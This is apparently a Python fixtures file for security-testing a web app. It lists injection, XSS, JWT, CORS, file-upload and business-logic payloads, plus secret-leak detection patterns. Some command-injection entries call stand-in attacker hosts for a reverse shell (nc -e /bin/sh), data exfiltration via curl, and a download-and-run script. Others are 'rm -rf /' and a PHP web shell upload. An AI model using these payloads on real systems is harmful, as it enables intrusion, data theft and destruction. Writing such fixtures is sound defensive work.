"""Security test payloads and fixtures for comprehensive security testing."""

# SQL Injection Payloads
SQL_INJECTION_PAYLOADS = [
    "'; DROP TABLE simulations; --",
    "1 OR 1=1",
    "1'; UNION SELECT * FROM users--",
    "1' AND SLEEP(5)--",
    "'; EXEC xp_cmdshell('dir')--",
    "admin'--", 
    "' OR 'x'='x",
    "1'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
    "1' UNION SELECT username, password FROM users--",
    "'; UPDATE users SET role='admin' WHERE username='user'; --"
]

# NoSQL/JSON Injection Payloads
NOSQL_INJECTION_PAYLOADS = [
    '{"$ne": null}',
    '{"$gt": ""}', 
    '{"$where": "function() { return true; }"}',
    '{"$regex": ".*"}',
    '{"$in": ["admin", "user"]}',
    '{"$or": [{"admin": true}]}',
    '{"$eval": "db.users.drop()"}',
    '{"$text": {"$search": "admin"}}',
    '{"$expr": {"$gt": ["$admin", false]}}',
    '{"constructor": {"prototype": {"admin": true}}}'
]

# XSS Payloads
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    '"><script>alert("xss")</script>',
    "javascript:alert('xss')",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert('xss')>",
    "{{constructor.constructor(\"alert('xss')\")()}}",
    "<iframe src=javascript:alert('xss')></iframe>",
    "<body onload=alert('xss')>",
    "<input type=image src=x:x onerror=alert('xss')>",
    "<marquee onstart=alert('xss')>",
    "<details open ontoggle=alert('xss')>",
    "'-alert('xss')-'",
    "\"><svg onload=alert('xss')>",
    "</script><script>alert('xss')</script>",
    "<%2fscript%2f><%2fscript%2f><script>alert('xss')</script>"
]

# Command Injection Payloads
COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "&& cat /etc/passwd", 
    "| whoami",
    "`id`",
    "$(curl evil.com)",
    "; rm -rf /",
    "&& python -c 'import os; os.system(\"ls\")'",
    "; curl http://attacker.com/$(whoami)",
    "&& nc -e /bin/sh attacker.com 4444",
    "| wget http://attacker.com/shell.sh -O /tmp/shell.sh",
    "; chmod +x /tmp/shell.sh && /tmp/shell.sh",
    "&& python -c 'import subprocess; subprocess.call([\"id\"])'"
]

# JWT/Token Manipulation Payloads
INVALID_JWT_PAYLOADS = [
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature",
    "not.a.jwt",
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJ0ZXN0In0.",  # alg: none
    "",
    "malformed-jwt-token",
    "Bearer",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..invalid_signature",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid",
    "x" * 1000,  # Oversized token
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ."  # None algorithm
]

# Malicious Origins for CORS Testing
MALICIOUS_ORIGINS = [
    "http://malicious-site.com",
    "https://evil.example.com", 
    "http://phishing.site",
    "https://attacker.com",
    "http://localhost:8080",  # Different port
    "https://simulation.lightoflifeclub.com.evil.com",  # Subdomain attack
    "http://127.0.0.1:3000",
    "null",
    "file://",
    "data:text/html,<script>alert('xss')</script>"
]

# PII Test Data
PII_TEST_PATTERNS = [
    r'010-\d{4}-\d{4}',  # Korean phone numbers
    r'01[016789]-\d{3,4}-\d{4}',  # Various Korean phone formats
    r'\d{6}-\d{7}',      # Korean resident registration format
    r'\d{6}',            # Potential OTP codes  
    r'password',         # Password fields
    r'ssn',              # SSN indicators
    r'주민등록번호',        # Korean SSN
    r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',  # Email addresses
    r'\d{3}-\d{2}-\d{4}', # US SSN format
    r'4\d{3}-\d{4}-\d{4}-\d{4}',  # Credit card numbers (Visa)
]

# Rate Limiting Test Parameters
RATE_LIMIT_TESTS = {
    "otp_send": {
        "endpoint": "/api/otp/send",
        "limit": 3,
        "window": 900,  # 15 minutes in seconds
        "test_phone": "010-1234-5678",
        "test_name": "Rate Limit Test User"
    },
    "otp_verify": {
        "endpoint": "/api/otp/verify", 
        "limit": 6,
        "window": 300,  # 5 minutes per OTP code
        "test_phone": "010-1234-5678",
        "invalid_code": "000000"
    }
}

# File Upload Security Test Data
MALICIOUS_FILE_UPLOADS = [
    {
        "filename": "shell.php",
        "content": "<?php system($_GET['cmd']); ?>",
        "content_type": "application/x-php"
    },
    {
        "filename": "script.js",
        "content": "alert('xss'); fetch('/api/admin/users').then(r=>r.json()).then(console.log);",
        "content_type": "text/javascript"
    },
    {
        "filename": "malware.exe",
        "content": b"\x4d\x5a\x90\x00" + b"A" * 1000,  # Fake PE header
        "content_type": "application/octet-stream"
    },
    {
        "filename": "../../../etc/passwd",
        "content": "root:x:0:0:root:/root:/bin/bash",
        "content_type": "text/plain"
    },
    {
        "filename": "image.svg",
        "content": '<svg onload="alert(\'xss\')" xmlns="http://www.w3.org/2000/svg"><text>test</text></svg>',
        "content_type": "image/svg+xml"
    }
]

# HTTP Security Headers that should be present
REQUIRED_SECURITY_HEADERS = {
    "X-Frame-Options": ["DENY", "SAMEORIGIN"],
    "X-Content-Type-Options": ["nosniff"],
    "X-XSS-Protection": ["1; mode=block", "0"],  # 0 is also acceptable (disabled)
    "Strict-Transport-Security": ["max-age="],  # Should contain max-age
    "Content-Security-Policy": ["default-src"],  # Should have some CSP
    "Referrer-Policy": ["strict-origin-when-cross-origin", "same-origin", "no-referrer"],
    "Permissions-Policy": ["geolocation=", "microphone=", "camera="]  # Should restrict permissions
}

# Business Logic Attack Scenarios
BUSINESS_LOGIC_ATTACKS = {
    "negative_values": {
        "simulation_data": {
            "plan_id": "A",
            "starting_company_round": -1,
            "current_company_round": -5,
            "simulation_rounds": -10,
            "scheduled_payment": {"-1": -1000000}
        }
    },
    "extreme_values": {
        "simulation_data": {
            "plan_id": "A", 
            "starting_company_round": 999999,
            "current_company_round": 999999,
            "simulation_rounds": 999999,
            "scheduled_payment": {"1": 999999999999999}
        }
    },
    "type_confusion": {
        "simulation_data": {
            "plan_id": ["array", "instead", "of", "string"],
            "starting_company_round": "string_instead_of_int",
            "current_company_round": {"object": "instead_of_int"},
            "simulation_rounds": None,
            "scheduled_payment": "string_instead_of_object"
        }
    },
    "race_condition": {
        "concurrent_requests": 10,
        "delay": 0.01  # Small delay between requests
    }
}

# Cryptographic Security Test Vectors
CRYPTO_TEST_VECTORS = {
    "weak_passwords": [
        "password",
        "123456", 
        "admin",
        "root",
        "test",
        "",
        "a",
        "12345678"
    ],
    "hash_test_inputs": [
        {"name": "Test User", "phone": "010-1234-5678"},
        {"name": "테스트사용자", "phone": "010-9876-5432"}, 
        {"name": "admin", "phone": "010-0000-0000"},
        {"name": "", "phone": "010-1111-2222"},  # Edge case
        {"name": "User With Spaces", "phone": "010 2222 3333"},  # Space handling
    ]
}

# Expected Error Messages (for security)
SECURITY_ERROR_PATTERNS = {
    "authentication": ["unauthorized", "authentication", "token", "invalid", "expired"],
    "authorization": ["forbidden", "access denied", "permission", "admin", "privilege"],
    "validation": ["invalid", "malformed", "validation", "format", "required"],
    "rate_limit": ["rate limit", "too many", "throttle", "limit exceeded", "wait"],
    "injection": ["syntax error", "invalid query", "malformed request"],
}

# Sensitive Information Patterns (should NOT appear in responses)
SENSITIVE_PATTERNS = [
    r"password\s*[:=]\s*['\"][^'\"]*['\"]",  # Password in config
    r"secret\s*[:=]\s*['\"][^'\"]*['\"]",    # Secret keys
    r"api_key\s*[:=]\s*['\"][^'\"]*['\"]",   # API keys
    r"private_key",                           # Private keys
    r"supabase_secret_key",                   # Supabase secrets
    r"jwt_secret",                            # JWT secrets
    r"database_url",                          # Database URLs
    r"connection_string",                     # DB connection strings
    r"traceback",                             # Python tracebacks
    r"stack trace",                           # Stack traces
    r"/home/[^/\s]+",                        # File paths
    r"c:\\[^\\s]+",                          # Windows paths
]